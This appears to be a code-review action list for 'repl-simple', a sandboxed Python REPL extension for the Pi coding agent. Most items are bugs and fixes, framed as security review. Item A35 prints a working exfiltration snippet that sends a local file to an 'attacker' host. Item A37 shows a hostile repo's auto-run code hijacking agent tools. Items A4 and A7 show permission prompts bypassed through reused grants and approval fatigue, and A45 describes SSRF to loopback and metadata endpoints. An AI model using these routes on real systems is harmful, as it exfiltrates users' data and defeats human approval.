# repl-simple — Actionable Items (v2)

Each item is scoped to become **one GitHub issue**. The title line is the issue title; everything under
it is the body. Finding IDs in brackets — `[B7]`, `[H24]` — point back to `REVIEW.md` (commit
`dfc1136`).

**Effort key:** `S` ≤ half a day · `M` ~1–3 days · `L` ~1 week+

**What changed since v1:** `A1` and `A27` are **done**. Nine items are **partial**. Sixteen new items
(`A33`–`A48`) are added, five of them stop-ship. Numbers `A1`–`A32` keep their original meaning so
existing references stay valid.

---

## Track −1 — STOP-SHIP

These five gate everything. Until they land, the `repl` tool corrupts its own output, cannot be
cancelled, and exfiltrates without a prompt.

---

### A33 — Fix the `runDispatchLoop` accumulator desync

**Labels:** `bug`, `blocker` · **Effort:** S · `[B7]` `[B8]`

The `sandbox.ts` refactor converted two live closure variables into a by-value snapshot struct while
leaving `printCallback` and `onAbort` writing to the originals. `acc.stdout`, `acc.stdoutTruncated`,
and `acc.aborted` are read 21 times and **assigned zero times**. Consequences:

- All stdout after the first tool call is dropped from `RunResult` (`print()` after any host-tool call
  is invisible to the model).
- `stdoutTruncated` is reported `false` while output is both truncated *and* discarded.
- Mid-run abort is a complete no-op — a **regression** against `32fe48a`, which stopped the loop
  between pause points.

**Do:**
- Make `DispatchAccumulators` the single mutable owner. `printCallback` writes `acc.stdout += …` and
  `acc.stdoutTruncated = true`; `onAbort` writes `acc.aborted = true`.
- Delete the now-genuinely-unused `maxStdout` and `printCallback` parameters at `sandbox.ts:178-179`
  (their being unused today is the symptom that flagged this).
- Turn on `noUnusedParameters` in `tsconfig.json` so the next such extraction fails loudly.

**Acceptance:** the two differential experiments in `REVIEW.md` §3 B7/B8 produce the same results at
HEAD as at `32fe48a`. Plus the tests in A44 items 1 and 2.

---

### A34 — Give the `repl` path a default timeout and plumb the abort signal

**Labels:** `bug`, `blocker`, `security` · **Effort:** S · `[B5]` · supersedes half of `A7`

`extensions/repl-extension.ts:61` discards the `_signal` Pi provides; `repl.ts:41` passes neither
`limits` nor `signal`. `sandbox.ts:145` returns `undefined` when no limits are given. Confirmed:
`while True: pass` blocks Node's event loop entirely, a 2 s `setTimeout` never fires, and the process
needs `SIGKILL`.

**Do:**
- Default `maxDurationSecs` (suggest 30) and `maxMemory` in `toResourceLimits` when the caller passes
  none. Verified working: `{limits:{maxDurationSecs:2}}` → `TimeoutError` in 2101 ms.
- Thread `_signal` → `ReplRunner.run/resume` → `RunOptions.signal`.
- Expose both as `repl` tool parameters with sane caps.

**Note:** a signal alone is insufficient — pure-Python loops yield no pause points, so only
`maxDurationSecs` bounds this. Land A33 first or the abort half stays dead.

**Acceptance:** `repl` with `while True: pass` returns a `TimeoutError` `RunError` within the default
budget and the Pi process stays responsive throughout.

---

### A35 — Close the read and egress surface on the shipped registry

**Labels:** `security`, `blocker` · **Effort:** M · `[B3]` · replaces `A5`

Confirmed end-to-end through `ReplRunner`, **zero prompts**:

```python
secret = read('/etc/hostname')
http_get('http://attacker/exfil?d=' + secret)   # server received it
```

`read`/`grep`/`find`/`ls` are `mutating: false` so `gateMutating` never touches them
(`bridge.ts:53-96,159`); pi's own path handling has no cwd jail (`path-utils.js:40-46`). `http_get`
never sets `requiresApproval` (`builtins.ts:212-248`). The good jail in `builtins.read_file` is
bypassed simply by using the other `read`.

**Do:**
- Jail the bridged read tools to `cwd` using the same `realpath`-checked helper as
  `builtins.ts:111-145`, **or** gate them. Breaking either link breaks the chain.
- Gate `http_get`, or restrict it to an explicit allowlist.
- Add SSRF defences (see A45) as defence in depth.
- Add a `gateReads` option to `BridgeOptions` so callers can choose.

**Acceptance:** the exfiltration snippet above either prompts or fails. A test asserts both halves.

---

### A36 — Guard the three prologue resumes, then make suspension reachable

**Labels:** `bug`, `blocker` · **Effort:** S · `[B4]` `[B9]` · absorbs `A10`

Two findings that **must land in this order**.

`sandbox.ts:660`, `:692`, `:710` — the prologue `snapshot.resume()` calls are outside any
`try/catch (MontyRuntimeError)`, unlike all eleven resumes in the shared loop. The refactor rewrote
this prologue and left them. Confirmed: deny a tool, Python doesn't catch → `resumeSuspended` throws
instead of returning a `RunError`; `session.ts:302-304` clears `suspended` *after* the await, so the
throw skips it and the session wedges permanently.

Separately, `extensions/repl-extension.ts:28-39` returns only `boolean`, but suspension requires the
literal `"suspend"` (`types.ts:30`, `sandbox.ts:311`). So `status:"suspended"` is unreachable,
`repl_abandon` always says "No pending suspension", and `repl_resume` on a live session throws
`Error("No suspended execution to resume")` uncaught. **Two of the four registered tools are
non-functional as shipped, and their descriptions instruct the model to call them.**

**Do:**
1. Wrap the three prologue resumes exactly as the loop does.
2. Catch the no-suspension case in `ReplRunner.resume` and return a friendly string, matching the
   no-session branch one line above (`repl.ts:58-63`).
3. Only then: replace `ctx.ui.confirm` with `ctx.ui.select` offering approve / deny / decide-later,
   and return `"suspend"` for the third. Also widen `Session.resume`'s `decision` from `boolean`
   (`[M5]`).
4. Name the `sessionId` in `formatResult`'s suspended branch so the model knows what to resume.

**Acceptance:** a deny-with-uncaught-`PermissionError` returns a `RunError` and leaves the session
usable; a full suspend → resume → approve round trip works through the real extension.

---

### A37 — Stop auto-executing `.pi/code-tools` unreviewed

**Labels:** `security`, `blocker` · **Effort:** M · `[H26]` · replaces `A6`

`repl.ts:99-100` reads every `.py` under `<cwd>/.pi/code-tools` on session creation and injects the
raw source as a preamble that runs before user code on every run, with full host-tool access and no
approval. Confirmed: a file containing `def read_file(path): return "SHADOWED"` **silently replaced
the jailed builtin** for the whole session, because host tools only resolve for names Python has not
bound (`sandbox.ts:205-227`) and the preamble runs first.

`.pi/` is not in `.gitignore`. **The delivery vector is a cloned repo, not `save_tool`** — clone a
hostile repo, ask Pi anything that touches `repl`, and the file executes.

**Do:**
- Prompt once per file content-hash before including it, and remember the approval per hash.
- Refuse preamble definitions that shadow a registered host-tool name, or register host tools in a
  namespace Python code cannot rebind.
- Register `createToolStoreTools` in `repl.ts` so the model can `read_tool`/`delete_tool` what runs
  (today the read side ships and the write side is withheld — the worst split).
- Wrap the read loop in `try` so one bad entry is skipped, not fatal (`[H35]`: a **directory** named
  `dir.py` makes every `repl` call fail forever with `EISDIR`, unrecoverable by `repl_reset`).
- Add `.pi/` to `.gitignore`; cap total preamble size and file count.

**Acceptance:** a fresh clone with a hostile `.pi/code-tools/x.py` does not execute it without an
explicit prompt; an unreadable entry does not break the session.

---

## Track 0 — Ground truth

### A1 — Verify the suite passes and `tsc` is clean ✅ **DONE**

`npm ci && npx tsc --noEmit && npm test` → **375 tests, 101 suites, 0 failures, exit 0**, 13.5 s.
`dfc1136`'s commit-message claim is accurate. First reproducible green run in the project's history.

**Caveat that keeps this from being a gate:** `tsc` does not see `extensions/` (A38), and 16 of 24
mutations survive (A44).

---

### A2 — Add CI

**Labels:** `chore`, `infra` · **Effort:** S · `[H22]` · **STILL OPEN**

No `.github/`, no linter, no formatter, no hooks. Nothing enforces the green run A1 established.

**Do:**
- `.github/workflows/ci.yml` running `npm ci && npm run check && npm test` on push and PR.
- Matrix Node 22 + 24, Linux + macOS (`@pydantic/monty` ships per-platform native binaries).
- Add `engines: {"node": ">=22.19.0"}`; `@earendil-works/pi-coding-agent@0.84.1` requires it.
- `.nvmrc`, `.editorconfig` (2-space, LF, UTF-8), Biome or Prettier + ESLint wired into CI.
- `--experimental-test-coverage` with a floor.
- Document the `@pydantic/monty` **musl gap**: no Alpine build at any version; install succeeds, load
  fails.

**Acceptance:** a red CI run blocks merge.

---

### A3 — README and MIT attribution — **PARTIAL**

**Labels:** `docs`, `legal` · **Effort:** S · `[H23]` `[N10]`

`README.md` exists (the A3 documentation half is done). **The legal half is untouched:** a repo-wide
grep for `pi-reepl|pi-code-tool|ivanvza|derived from|adapted from|ported from` returns zero hits, and
`LICENSE` still names only one author.

**Do:**
- Add upstream attribution to `LICENSE`/`NOTICE` and credit the RLM whitepaper.
- Fix `README.md:31-33`: it lists `save_tool`, `delete_tool`, `read_tool`, `list_saved_tools` and the
  RLM tools as "available Python-side tools". Inside `repl` they are all `NameError`.
- Fix `README.md:74`: the `pi.extensions` auto-load claim is true only for `pi package add` (A39).
- Document `runRlm` or delete it (A40) — the README currently documents only `RLMLoop`.
- `README.md:37-72`'s `import … from "repl-simple"` example cannot resolve until A9 lands. Mark it
  aspirational or fix A9 first.

---

## Track 1 — Security

### A4 — Scope approval grants to a call site, not to a command string forever

**Labels:** `security` · **Effort:** M · `[B2]` · **STILL OPEN, severity up**

Measured through the shipped tool: approve `bash("date +%s%N")` once → a later
`[bash("date +%s%N") for i in range(3)]` runs **0 prompts, 3 distinct nanosecond timestamps**.
Approve `write('f.txt','v1')` once → **7 real writes, 1 prompt**.

Cause: approval is a position-independent `Set` (`session.ts:172`, auto-approving at `:190-207`
*before* the callback) while the cache is positional (`:88-99`, falling through to real execution at
`:102` once the cursor is exhausted).

**Two v1 sub-claims are refuted and should not be repeated in the issue:** grants are **in-process
only** (`dump()`/`load()` are never called on the shipped path), and `save_tool` is **not reachable**
from inside `repl`. The finding stands on its own: a grant binds to the command *string*, not to the
script's *content*.

**Do:**
- Make the gate consult the same cursor as the cache: auto-approve only when this call is a genuine
  positional replay.
- Scope grants to (snippet index, call index), not to a global key set.
- Add expiry and a per-key execution count; surface remaining grants in `repl_reset`'s output.

**Acceptance:** the loop above prompts on the first *new* execution.

---

### A5 — superseded by **A35**.

### A6 — superseded by **A37**.

---

### A7 — Bound resource consumption and spend — **PARTIAL via A34**

**Labels:** `security` · **Effort:** M · `[B5]` `[H8]` `[H9]` `[H32]` `[H34]`

A34 covers the timeout. The rest is still open:

- **`[H32]`** `repl.ts:112` pushes `[result]` with **no cap** — `'A'*2000000` returns a 2,000,009-byte
  tool result into the model's context. Apply `maxStdoutBytes`-style truncation to `output` too.
- **`[H9]`** `runRlm` messages grow unbounded: measured **1.57 MB across 4 iterations** (~390 K
  tokens). See A23.
- **`[H8]`** no global token/spend budget across nested RLM fan-out.
- **`[H34]`** one `repl` call produced **20 modal approval dialogs** with no rate limit, no "deny
  all", and no cancel path (`_signal` discarded). This is a fatigue primitive: vary the command until
  the user clicks yes once, which then becomes a permanent grant (A4). Add a per-run approval cap and
  a "deny remaining" action.

---

### A45 — Add SSRF defences to `http_get`

**Labels:** `security` · **Effort:** S · `[H36]` `[H20]`

`builtins.ts:223-247` checks only `/^https?:\/\//i` on the **initial** URL, then uses default
`redirect: "follow"` with no timeout and no IP validation. Confirmed: a public-looking URL 302-ing to
`http://127.0.0.1:<port>/` **returned the internal body**. `169.254.169.254` failed only for network
reasons — no policy blocks it.

**Do:** resolve and validate the IP for every hop (block loopback, link-local, RFC1918, `::1`,
metadata endpoints); set `redirect: "manual"` and re-validate each hop; add a timeout via
`AbortSignal.timeout`; keep the existing 256 KiB streaming cap, which is correct.

**Acceptance:** the redirect-to-loopback experiment fails closed.

---

### A30 — Redact secrets from dumps and model feedback — **latent, not reachable**

`Session.dump()` is never called on the shipped path, so this is not currently exploitable. Keep it
open as a precondition for any future persistence work; `callCache` would serialize raw file contents,
`bash` stdout, and HTTP bodies unredacted (`session.ts:359-379`).

---

## Track 2 — Loadable and consumable

### A38 — Put `extensions/` inside the TypeScript program

**Labels:** `bug`, `infra` · **Effort:** S · `[H30]`

`tsconfig.json:11` includes only `src/` and `test/`. `tsc --listFilesOnly` yields **zero** files under
`extensions/`, so `npm run check` is green while the sole shipping entry point is unchecked. Checking
it directly fails: `error TS2307: Cannot find module 'typebox'`. `plan-issue-9.md:16` listed this as
required work; it was not done.

**Do:**
- Add `typebox` as a **devDependency** (it resolves at runtime only because pi aliases it from its own
  install — that is a runtime mechanism, not a compile-time one).
- Add `extensions/**/*.ts` to the type-checked program (see A9 for the `rootDir` split).
- Add the import smoke test from A44 item 6.

**Acceptance:** `npm run check` fails if `repl-extension.ts` breaks.

---

### A39 — Point `pi.extensions` at the file, not the directory

**Labels:** `bug`, `blocker` · **Effort:** S · `[B1]`

Pi has **two inconsistent implementations** of `resolveExtensionEntries`. `package-manager.js:364`
(used by `pi package add`) stats the directory and expands it — works. `loader.js:473-491` (used by
`pi --extension <path>` and settings `extensions: [...]`) pushes the path after `existsSync` with no
`isFile()` check and hands it to `jiti.import()` — dies with `Cannot find module '.../extensions'`,
registering zero tools.

**Do:** change `package.json:17` to `"./extensions/repl-extension.ts"`. Verified: pointing pi's real
loader at the file registers all four tools with no errors.

**Acceptance:** `discoverAndLoadExtensions(["<repo>"])` returns four tools and an empty error list.

---

### A9 — Fix the build so `dist/` works — **STILL OPEN**

**Labels:** `bug`, `infra` · **Effort:** S · `[H1]` `[H2]`

- No `rootDir` and no `exclude`, so `npm run build` emits `dist/src/` **and** `dist/test/` — all
  twelve test files compile into the shipped tree. `extensions/` is not compiled at all.
- `getReplPreamble()` (`rlm_loop.ts:74-75`) resolves `join(__dirname,"..","repl","repl_server.py")`;
  in `dist/src/rlm_loop.js` that is `dist/repl/repl_server.py`, which nothing copies. Reproduced:
  **ENOENT**. `readFileSync` at `:342` has no try/catch.
- `package.json` has no `main`, `exports`, `types`, `files`, or `license`, and is `"private": true`.
  Staged into a consumer's `node_modules`: `ERR_MODULE_NOT_FOUND`. `README.md:37-72` shows an import
  that cannot resolve, and `:66-72` tells users to depend on a package that cannot be published.
- `npm pack --dry-run` ships **34 entries** including all sources, all tests, `plan-issue-9.md`, and
  **no `dist/`** (with no `files` field npm falls back to `.gitignore`, which lists `dist/`).

**Do:** `rootDir: "src"`, a separate `tsconfig.test.json` for tests + extensions, a build step copying
`repl/*.py`, and `main`/`types`/`exports`/`files: ["dist","repl","extensions"]`/`license`/
`prepublishOnly`. Drop `private` when publishing. This closes H1 for free.

**Acceptance:** a scratch consumer can `import { ReplRunner } from "repl-simple"` and call
`getReplPreamble()` against the built artifact.

---

### A8 — Pi extension entry point — **PARTIAL**

`extensions/repl-extension.ts` ships with four tools and a real approval dialog. Remaining: A36 (two
of the four tools are non-functional), A38, A39, and issue #13's `rlm_query` Pi tool, which still does
not exist — no path/data loading, no directory walk, no caps, no render.

---

## Track 3 — Sandbox correctness

### A27 — Extract the duplicated dispatch loop ✅ **DONE (with regressions)**

`runDispatchLoop` extracted at `sandbox.ts:174-453`; both entry points delegate; 971 → 731 lines. The
seam and the body are right. **A33 fixes the state plumbing it broke.** Note `printCallback` is still
duplicated at `:490-503` and `:622-632`.

---

### A11 — Check `aborted` before executing the approved tool on resume — **STILL OPEN**

`sandbox.ts:643-651` resolves args and `await tool.execute(...)` with no `aborted` check; the first
check is at `:184`, after the side effect. `[H14]`. Compounded by B8 — until A33 lands, even the
post-hoc check reads a stale value.

---

### A12 — Fix stdout truncation (bytes vs characters) — **STILL OPEN**

`sandbox.ts:493-497` and `:625-628` — `text.slice(0, maxStdout - Buffer.byteLength(stdout))` mixes a
byte budget with a character index. Measured: `print("é"*50)` with a 10-byte cap returns **42 bytes /
32 chars**. Both copies were kept verbatim through the refactor, and both boundary mutations (M11,
M12) survive the suite. `[H12]` `[L2]` `[L3]`

---

### A13 — Fix `SUBMIT` — **STILL OPEN, now confirmed by execution**

`returns: "void"` degrades the stub to `SUBMIT: Any = None`, so the type checker catches nothing;
`resolveToolArgs` does not enforce required params; `sandbox.ts:380` bypasses `formatOutput`. Measured:
`SUBMIT()` → `output: undefined`; `SUBMIT(42)` → `output: 42` — both violating `RunOk.output: string`
(`types.ts:69`), both flowing straight into `RlmResult.answer`. `[H13]` `[H25]`

---

### A46 — Make tool aliasing work, or fail with a comprehensible error

**Labels:** `bug` · **Effort:** S · `[H29]`

Confirmed: `echo("hi")` works; `f = echo; f("hi")` → `NameError: name 'SENTINEL' is not defined`. Any
aliasing, higher-order use (`map(read_file, paths)`), or storing a tool in a dict fails, and the error
leaks an internal identifier the model cannot act on. Nothing tests it.

**Do:** either bind tool names to a callable that survives aliasing, or detect the pattern and raise a
`TypeError` naming the actual constraint. Add a test either way.

---

## Track 4 — Session / replay correctness

`session.ts` is byte-identical to `32fe48a`, so **A14, A15, A16, A17, A18 are all STILL OPEN** exactly
as written in v1: pre-gate calls not cached across suspension `[H15]`; `inputs` not session state
`[H16]`; failures not cached and effects discarded `[H17]`; unbounded growth and stdout starvation
`[H18]`; no dump validation `[M6]`.

Their severity is up: all are now on the shipping path via `repl.ts`.

Two new items in this track:

---

### A40 — De-duplicate stdout across `repl` calls

**Labels:** `bug` · **Effort:** M · `[H27]`

`session.ts:161-166` replays the whole transcript every run and nothing de-duplicates stdout, so each
`repl` call re-emits all prior output:

```
run1 -> "alpha"      run2 -> "alpha\nbeta"      run3 -> "alpha\nbeta\ngamma"
```

Destructively past the cap: `print('Z'*300000)` then `print('IMPORTANT-NEW-OUTPUT')` → the second call
returns 262,180 bytes of stale `Z`s and the new output is **absent**. Every later call in that session
is a stale 256 KB blob. Only `repl_reset` recovers.

**Do:** track a stdout high-water mark per snippet and return only the delta. Land after A33, which
changes what `result.stdout` contains.

---

### A41 — Serialize session creation and bound the session pool

**Labels:** `bug` · **Effort:** S · `[H33]` `[N13]`

`repl.ts:85-92` — `get` → `await createSession()` (disk I/O) → `set`, with no lock. Confirmed:
`Promise.all([run("x = 1","s"), run("y = 2","s")])` both report success, then `print(x)` fails with
`Name 'x' used when not defined`. The model is told its assignment succeeded when it was discarded.

Also: `sessions` is an unbounded, model-keyed `Map` with no cap or eviction; `reset()` clears the
`Session`'s fields but leaves the entry. 50 distinct ids → 50 retained sessions, each holding every
snippet and the full `callCache`.

**Do:** store an in-flight promise in the map before awaiting; add an LRU cap and evict on `reset`.

---

## Track 5 — RLM

### A47 — Converge the two RLM implementations on `runRlm`

**Labels:** `refactor` · **Effort:** M · `[H31]` · absorbs `A19`, `A25`, `A26`, `A29`(part)

`rlm_loop.ts` (`RLMLoop`, 357 lines) and `rlm.ts` (`runRlm`, 259 lines) do the same job with three
redundant type families, both exported from `index.ts`, differing only in casing, with no doc
comment or deprecation. Neither is more complete — each fixes a distinct subset of the v1 findings, so
**no single object carries all the fixes**. Neither is reachable from the shipped extension.

Keep `runRlm`: it is 100 lines shorter, better structured, and its gaps are one-to-five-line fixes,
whereas `RLMLoop`'s core gaps (no fence tolerance, no abort, no salvage) are contract-level.

**Do, in one PR:**
1. Move `LlmClient`, `RlmIteration`, `RlmOptions`, `RlmResult` out of `types.ts:99-158` into
   `rlm.ts`, deleting the mid-file `import type { ToolRegistry }` at `:101` that inverts the layering
   (`[N11]` — type-only and erased at emit, so harmless today, but it becomes a real cycle the moment
   a value is needed). Re-export from `index.ts`; no consumer break.
2. Port `RLMLoop`'s `buildSystemPrompt` (`rlm_loop.ts:265-315`) so the prompt is built from the real
   registry — `renderTypeStubs()` + `renderPythonToolRules(probeImportableModules())`. This fixes
   `[H10]`/`[H11]` once, for the merged path. Today `runRlm`'s static prompt tells the model to call
   `llm_query`/`SUBMIT` **without registering them** and never names any tool it does have.
3. Port `createRLMTools` construction and the name-collision check (`rlm_loop.ts:82-90`).
4. Port nesting: `maxDepth`/`depth` with the downgrade-to-`llmQuery` branch (`rlm_loop.ts:212-221`).
   Add parent-context inheritance while there (`[A26]`, `[M16]`).
5. Add `"error"` to `RlmResult["status"]` so an `llmClient` throw is a result, not an exception.
6. Move `getReplPreamble` to `src/preamble.ts` next to `loadSavedTools`.
7. Delete `rlm_loop.ts` and its four exports; fold `test/rlm_loop.test.ts` in, keeping the
   nesting/depth/collision/prompt cases.
8. Update the README.

**Acceptance:** one RLM entry point; `grep RLMLoop src/` returns nothing.

---

### A42 — Fix SUBMIT detection in `runRlm`

**Labels:** `bug` · **Effort:** S · `[H24]`

`rlm.ts:242` matches on tool name only, ignoring `c.ok` — while the comment two lines above says *"a
SUBMIT call in the trace with `ok:true`"*. **The code contradicts its own comment.** A malformed
`SUBMIT("a", answer="b")` ends the run and returns `{status:"ok", answer:"SUBMIT() got multiple values
for argument 'answer'"}`; wrapped in `try/except`, it returns whatever the last expression evaluated
to. `rlm_loop.ts:151` guards correctly.

**Do:** `result.calls.find(c => c.tool === "SUBMIT" && c.ok)`. The `submitCall.error ?? ""` fallback
then becomes dead and should go — a successful `SubmitSignal` always short-circuits to `status:"ok"`.

**Acceptance:** the A44 item 2 test — turn 1 emits a malformed SUBMIT, turn 2 a valid one; assert two
iterations and the real answer.

---

### A43 — Restore the unconditional `context` input

**Labels:** `bug` · **Effort:** S · `[H28]`

`rlm_loop.ts` always injected `context: context ?? ""`. `rlm.ts:187-192` injects inputs only when the
caller passes `options.inputs`. `repl/repl_server.py:62-89` references the bare name `context`, so
without the input declaration the type check fails. Confirmed: with the intended preamble and no
inputs, iteration 1 fails with a ~4 KB, 12-error `unresolved-reference` message — deterministically,
so **all 10 iterations fail identically** while the whole blob is re-sent as feedback each time. The
advertised production configuration is a guaranteed no-op.

**Do:** always declare `context` (defaulting to `""`); announce every input key in the prompt, not
just `context` (`inputs: {context, other_data}` currently never mentions `other_data`). Add the
integration test `test/rlm.test.ts:87` was clearly meant to have — `REPL_SERVER` is loaded there and
never used.

---

### A20 — Fence extraction — **PARTIAL**

`rlm.ts:39-50` added ```python → generic → raw. Still missing (`[H38]`, all 11 cases executed):
` ```py `, ` ```Python `, single-line fences, fences with no newline before the close, and indented
fences — each falls through to "treat the whole response as code" and costs a full iteration to a
guaranteed `SyntaxError`. With two ```python blocks it takes the **first**, so a self-correcting model
loses its correction. No `extractDirectAnswer` fallback: a prose-only reply burns the iteration and
returns `""` (the `"(no answer)"` magic string was removed by #76).

---

### A21 — Stop shifting error line numbers — **STILL OPEN, worse than filed**

`rlm.ts:222-224` re-does `preamble + "\n" + code` and feeds `result.error` back verbatim. Measured
shift is **+103**, not the +90 v1 estimated — the type-check prefix was never counted (+13 on its own,
with no preamble at all). Monty errors embed a line number **and a rendered source excerpt**, so the
model is shown preamble source it never wrote, including internals like
`13 | NotADirectoryError: Any = None`. Runtime errors carry no line info, so only syntax/typing errors
are affected.

**Do:** add a `lineOffset` to `RunOptions`, subtract it before feeding diagnostics back, and strip
excerpt lines that fall inside the prefix.

---

### A22 — Never return empty — **DONE** (#76)

`extractBestAnswer` (`rlm.ts:102-113`) and a `status` discriminator exist. Resolved by #76: the
final synthesis pass runs at the cap (D44); salvaged values carry `answerSource` provenance (D41);
the `"(no answer)"` magic string is gone — `answer` is `""` (D42); and the `:104` comment now
matches its code (D43).

---

### A23 — Bound message growth — **STILL OPEN**

`rlm.ts:249-253` pushes two messages per iteration with no cap. Measured with a 300 KB print per
iteration: prompt sizes `[119, 262403, 524687, 786971]` bytes — **1.57 MB over 4 iterations**.
`buildFeedback:146` interpolates `result.stdout` with no limit of its own, and `result.output`
(`:145`) has **no cap at all**, so a snippet ending in the bare expression `context` adds a full
context copy to every later prompt.

---

### A24 — Progress events and structured trajectory — **PARTIAL**

`onIteration` + `RlmIteration` shipped. Still no `RlmStep`/`RlmProgressEvent`; `RlmResult` has 3 fields
of the 7 specced.

---

### A48 — Return partial results on abort

**Labels:** `bug` · **Effort:** S · `[H39]`

`rlm.ts:213-216` — `raceAgainstSignal` rejects and the `AbortError` propagates out of `runRlm`,
discarding every completed iteration. Confirmed: abort at iteration 2 of 5 → **no `RlmResult` at
all**, iterations reachable only via `onIteration`. `rlm_loop.ts` at least returned its transcript, so
this is a regression.

Also: `LlmClient.query` (`types.ts:109-114`) takes no `AbortSignal`, so the in-flight request runs to
completion and is billed. And a listener leaks onto the caller's signal per iteration (measured: 8
after 8 iterations), each retaining that run's stdout.

**Do:** return `{status:"aborted", answer: extractBestAnswer(iterations), iterations}`; add
`"aborted"` to `RlmResult["status"]`; add an `AbortSignal` parameter to `LlmClient.query`; remove the
listener after each run.

---

## Track 6 — Craft

### A28 — Memoize the capability probes — **STILL OPEN, worse**

`probeTypeCheckerGaps()` runs on every `runInSandbox`; `probeImportableModules()` on every
`RLMLoop.run()`. Results are process-invariant. Now worse: `ReplRunner.createSession`
(`repl.ts:94-101`) builds a fresh registry per session. `[M13]`

---

### A29 — Dead code and stale docs sweep — **PARTIAL**

`[N1]` fixed (stale docblock deleted) and the duplicate local sentinel is hoisted. Still open: `arg()`,
`numToSkip`/`skipped`, `suspendedRunOpts`, `CANDIDATE_MODULES`, the three uncalled helpers in
`session.test.ts`, and `[N4]`'s wrong comments.

**Add:** delete `plan-issue-9.md` (232 lines, `[N9]`) — committed four commits after `95ae49c` "chore:
remove working plan.md" established the opposite convention, and it documents the tsconfig change
that was never made (A38). It also ships in the tarball.

**Add:** `[N12]` `repl_reset` reports `Session 'X' reset.` for sessions that never existed.

**Add:** `[N14]` module naming — `repl.ts` / `rlm.ts` / `rlm_loop.ts` / `rlm_tools.ts` /
`repl_server.py`, five files separated by a transposed letter, two implementing the same feature.
Resolve as part of A47.

---

## Track 7 — Tests

### A44 — Write the tests that would have caught this release's bugs

**Labels:** `test` · **Effort:** M · supersedes `A31`

A 24-mutation campaign scored **8 killed / 16 survived**. By file: `rlm.ts` **0/9**, `repl.ts` **1/5**,
`sandbox.ts` **5/8** — and every `sandbox.ts` kill comes from `test/sandbox.test.ts`, the file the
refactor did **not** touch. **The 1,070 lines of new tests killed exactly one mutation.**

Two survivors are security-relevant: `gateMutating: true → false` (M9) and dropping the `onApproval`
callback entirely (M22) both pass. `test/repl.test.ts:23-30` defines `deny`/`approve` helpers that are
never used — the file's own dead code advertises the missing tests.

Write, in priority order:

1. **`print` after a loop-dispatched tool call, on both entry points.** Kills B7 and its
   `stdoutTruncated` sibling. `sandbox.test.ts:649-673` passes today only because its "after" print
   happens in the *prologue*, before `acc` is built — one more tool call would have caught it.
2. **Abort fired mid-run during an async tool.** Kills B8. Today only the pre-aborted signal is tested
   (`sandbox.test.ts:410`), the one case B8 leaves working.
3. **`repl_resume` round trip: approve → deny → no-suspension → no-session.** Kills M7, M8, M9, M22 —
   four survivors and the only entirely untested public method.
4. **A failed SUBMIT does not end the run.** Turn 1 emits `SUBMIT("a", answer="b")`, turn 2 a valid
   one; assert two iterations and the real answer. Kills M5; catches H24.
5. **Truncation at the exact byte boundary, on both paths, with multibyte input.** Kills M11 and M12 —
   still two copies of the same untested code after a de-duplication refactor.
6. **Extension import smoke test:** `mod.default({registerTool: t => names.push(t.name)})` and assert
   the four names. Fails today at the `typebox` import; pairs with A38.
7. **Feedback and prompt content asserted, not just message count.** Kills M6, M19, M20 and replaces
   the content-invariant oracle at `rlm.test.ts:687`.
8. **Defaults and salvage:** no `maxIterations` → 10 iterations; salvage returns the print, not
   `"None"`. Kills M1 and M3, replaces the `answer.length > 0` tautology at `rlm.test.ts:486`.

---

### A32 — Delete tautological tests and fix the inverted ones — **STILL OPEN, now larger**

v1's items stand (all pre-existing test files unchanged), plus new ones in `test/rlm.test.ts`:
`:778-796` asserts a same-repo constant against itself; `:130-171` asserts a callback returns what the
test made it return; `:92-128` duplicates `test/rlm_tools.test.ts` (~150 of the "25+ new tests" are
re-runs); `:716-741` is titled for a branch it never calls; `test/repl.test.ts:234-237` has no
assertion; and `makeMockLlm`/`makeRlmTools`/`REPL_SERVER` are ~60 lines of dead scaffolding.

Also correct `sandbox.test.ts:482-490`, whose title is wrong in the **opposite** direction from what
v1 filed: an `input` named `echo` **shadows** the tool (`TypeError: object is not callable`); it does
not "win" for the tool. The test passes no inputs, so it asserts nothing either way.

---

## Suggested order

```
A33 ──► A34 ──► A35 ──► A36 ──► A37          STOP-SHIP, in this order
 │                       │
 │                       └─ A36 step 1 (guard resumes) MUST precede step 3 (enable suspend)
 │
 ├─► A44 items 1,2 (pin A33 immediately)
 │
 ├─► A39 ──► A38 ──► A2 ──► A9               make it loadable, then gate it
 │
 ├─► A4 ──► A7, A45                          security model
 │
 ├─► A42, A43, A21, A20, A23, A48 ──► A47    RLM: fix, then converge
 │
 ├─► A11, A12, A13, A46                      sandbox correctness
 │
 ├─► A40, A41, A14–A18                       session correctness
 │
 └─► A28, A29, A32, A44 items 3-8            craft and tests
```

**Ordering constraints that matter:**

1. **A33 before everything.** Until the accumulator desync is fixed, `result.stdout` is wrong — which
   means any experiment, test, or bug report that reads it is unreliable, including re-runs of the
   experiments in `REVIEW.md`.
2. **A36 step 1 before step 3.** Guard the prologue resumes *before* making suspension reachable, or
   you convert a dead code path into a session-wedging one.
3. **A4 before any richer approval UI.** A dialog on top of today's caching semantics builds a
   convincing illusion of consent.
4. **A43 before A47.** Fix the `context` regression while `rlm_loop.ts` is still present as a
   reference for what the old behaviour was.

## Issues to reopen

| Issue | Prior claim | Now |
|---|---|---|
| **#9** `repl` tool | closed at 0% | **shipped** — `src/repl.ts` + 4 Pi tools exist. Reopen scoped to A36: two of the four tools cannot succeed. |
| **#14** Extension entry point | closed at 0% | **shipped** — registers 4 tools. Reopen scoped to A38/A39. |
| **#13** `rlm_query` Pi tool | closed at 5% | **still 5%** — no path/data loading, no directory walk, no caps, no render. Reopen unchanged. |
| **#5** Sandbox | closed | reopen for A33 — the refactor introduced three data-loss regressions. |
| **#12** RLM iteration loop | closed at 35% | ~65% via `runRlm`, but split across two implementations. Reopen for A47. |
| **#11** RLM system prompt | closed at 25% | **regressed** in the new path — `runRlm`'s prompt renders no registry at all. Reopen for A47 step 2. |
| **#10** RLM types | closed at 20% | ~45% — `RlmIteration`/`onIteration` shipped; no `RlmStep`/`RlmProgressEvent`. |
| **#15** Package config | closed at 45% | ~50% — README added; `main`/`exports`/`files` still absent. Reopen for A9. |
| **#7** Session, **#8** Toolstore | closed | unchanged code, but now on the shipping path. Reopen at raised severity. |
